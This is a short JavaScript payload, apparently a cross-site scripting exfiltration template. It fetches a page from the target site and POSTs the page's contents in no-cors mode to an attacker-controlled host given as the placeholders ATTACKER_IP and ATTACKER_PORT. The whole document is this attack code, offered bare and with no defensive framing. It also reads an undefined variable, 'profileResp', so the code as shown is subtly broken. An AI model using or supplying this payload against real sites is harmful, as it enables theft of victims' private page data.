(async () => {
	const LHOST = 'http://<ATTACKER_IP>:<ATTACKER_PORT>';
	
	const targetResp = await fetch ('/<TARGET>/<PAGE>');
	const target = await profileResp.text();
	
	const sendPage = await fetch(`${LHOST}`, {
		method: 'POST',
		body: target,
		mode: 'no-cors',
	});
})();
